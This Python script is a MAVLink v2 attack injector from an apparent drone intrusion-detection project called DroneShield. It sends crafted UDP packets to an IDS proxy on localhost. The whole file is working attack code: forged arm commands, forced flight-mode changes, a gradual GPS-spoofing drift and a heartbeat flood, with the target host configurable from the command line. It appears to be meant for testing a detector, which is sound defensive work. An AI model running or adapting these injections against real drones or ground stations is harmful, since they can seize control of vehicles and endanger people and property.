"""
DroneShield — Attack Injector
Crafts raw MAVLink v2 packets and injects them into the IDS proxy (port 14551).
Attack types: ARM injection, GPS spoofing (slow drift), forced mode change.
"""
import socket
import struct
import time
import argparse
import math
import logging

logging.basicConfig(level=logging.INFO, format="%(asctime)s [ATTACKER] %(message)s")

# MAVLink message IDs
HEARTBEAT    = 0
SET_MODE     = 11
COMMAND_LONG = 76
GPS_INPUT    = 232

CMD_ARM_DISARM = 400
CMD_TAKEOFF    = 21
CMD_LAND       = 20

CRC_EXTRA = {
    HEARTBEAT:    50,
    SET_MODE:     89,
    COMMAND_LONG: 152,
    GPS_INPUT:    151,
}

_seq = 0

def mavlink_crc(data: bytes) -> int:
    crc = 0xFFFF
    for byte in data:
        tmp = byte ^ (crc & 0xFF)
        tmp ^= (tmp << 4) & 0xFF
        crc = ((crc >> 8) ^ (tmp << 8) ^ (tmp << 3) ^ (tmp >> 4)) & 0xFFFF
    return crc


def build_mavlink(msg_id: int, payload: bytes, sys_id: int = 99, comp_id: int = 1) -> bytes:
    global _seq
    _seq = (_seq + 1) & 0xFF
    payload_len = len(payload)
    header = bytes([
        0xFD,           # magic
        payload_len,    # payload length
        0,              # incompat_flags
        0,              # compat_flags
        _seq,           # seq
        sys_id,         # sys_id  (99 = fake/unknown GCS)
        comp_id,        # comp_id
        msg_id & 0xFF,
        (msg_id >> 8) & 0xFF,
        (msg_id >> 16) & 0xFF,
    ])
    crc_data = header[1:] + payload
    if msg_id in CRC_EXTRA:
        crc_data += bytes([CRC_EXTRA[msg_id]])
    crc = mavlink_crc(crc_data)
    return header + payload + struct.pack("<H", crc)


def build_heartbeat() -> bytes:
    # custom_mode(u32) type(u8) autopilot(u8) base_mode(u8) system_status(u8) mavlink_version(u8)
    payload = struct.pack("<IBBBBB", 0, 6, 8, 81, 4, 3)
    return build_mavlink(HEARTBEAT, payload)


def build_arm_command(arm: bool = True) -> bytes:
    # COMMAND_LONG: param1-7 (f), command (u16), target_sys (u8), target_comp (u8), confirmation (u8)
    param1 = 1.0 if arm else 0.0
    payload = struct.pack("<fffffffHBBB",
        param1, 0, 0, 0, 0, 0, 0,   # params 1-7
        CMD_ARM_DISARM,               # command
        1, 1, 0                       # target_sys, target_comp, confirmation
    )
    return build_mavlink(COMMAND_LONG, payload)


def build_mode_change(mode: int) -> bytes:
    # SET_MODE: custom_mode (u32), target_system (u8), base_mode (u8)
    payload = struct.pack("<IBB", mode, 1, 217)
    return build_mavlink(SET_MODE, payload)


def build_gps_input(lat: float, lon: float, alt: float = 50.0) -> bytes:
    # Simplified GPS_INPUT payload
    time_usec = int(time.time() * 1e6)
    lat_int = int(lat * 1e7)
    lon_int = int(lon * 1e7)
    # time_usec(u64) gps_id(u8) ignore_flags(u16) time_week_ms(u32) time_week(u16)
    # fix_type(u8) lat(i32) lon(i32) alt(f) horiz_accuracy(f) vert_accuracy(f)
    # speed_accuracy(f) vn(f) ve(f) vd(f) hdop(f) vdop(f) satellites_visible(u8)
    payload = struct.pack("<QBHIHBiifffffffff B",
        time_usec,        # time_usec  (Q)
        0,                # gps_id     (B)
        0,                # ignore_flags (H)
        0,                # time_week_ms (I)
        0,                # time_week  (H)
        3,                # fix_type   (B) — 3D fix
        lat_int,          # lat        (i)
        lon_int,          # lon        (i)
        alt,              # alt        (f)
        1.5,              # horiz_accuracy (f)
        2.0,              # vert_accuracy  (f)
        0.5,              # speed_accuracy (f)
        0.0, 0.0, 0.0,    # vn, ve, vd    (fff)
        1.2,              # hdop       (f)
        1.8,              # vdop       (f)
        8,                # satellites_visible (B)
    )
    return build_mavlink(GPS_INPUT, payload)


class Attacker:
    def __init__(self, target_host: str = "127.0.0.1", target_port: int = 14551):
        self.target = (target_host, target_port)
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    def send(self, pkt: bytes) -> None:
        self.sock.sendto(pkt, self.target)

    def attack_arm_inject(self) -> None:
        logging.warning("ATTACK: ARM INJECTION")
        for _ in range(3):
            self.send(build_arm_command(arm=True))
            time.sleep(0.1)

    def attack_gps_spoof(self, base_lat: float = 37.7749, base_lon: float = -122.4194,
                          duration: float = 30.0, steps: int = 60) -> None:
        logging.warning("ATTACK: GPS SPOOFING — slow drift over 30s")
        # Drift ~0.01 degrees (~1.1 km) over 30 seconds
        for i in range(steps):
            frac = i / steps
            lat = base_lat + frac * 0.01
            lon = base_lon + frac * 0.005
            pkt = build_gps_input(lat, lon)
            self.send(pkt)
            time.sleep(duration / steps)

    def attack_mode_change(self, target_mode: int = 6) -> None:
        logging.warning(f"ATTACK: FORCED MODE CHANGE → mode {target_mode}")
        for _ in range(3):
            self.send(build_mode_change(target_mode))
            time.sleep(0.1)

    def flood(self, count: int = 50, interval: float = 0.02) -> None:
        logging.warning("ATTACK: PACKET FLOOD")
        for _ in range(count):
            self.send(build_heartbeat())
            time.sleep(interval)

    def run_all_attacks(self) -> None:
        logging.warning("=== Starting all attack sequences ===")
        time.sleep(1)
        self.attack_arm_inject()
        time.sleep(2)
        self.attack_mode_change()
        time.sleep(2)
        self.attack_gps_spoof()
        logging.warning("=== Attack sequence complete ===")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DroneShield MAVLink Attacker")
    parser.add_argument("--host",   default="127.0.0.1")
    parser.add_argument("--port",   type=int, default=14551)
    parser.add_argument("--attack", choices=["arm", "gps", "mode", "flood", "all"],
                        default="all")
    parser.add_argument("--mode-id", type=int, default=6)
    args = parser.parse_args()

    attacker = Attacker(args.host, args.port)
    attacks = {
        "arm":   attacker.attack_arm_inject,
        "gps":   attacker.attack_gps_spoof,
        "mode":  lambda: attacker.attack_mode_change(args.mode_id),
        "flood": attacker.flood,
        "all":   attacker.run_all_attacks,
    }
    attacks[args.attack]()
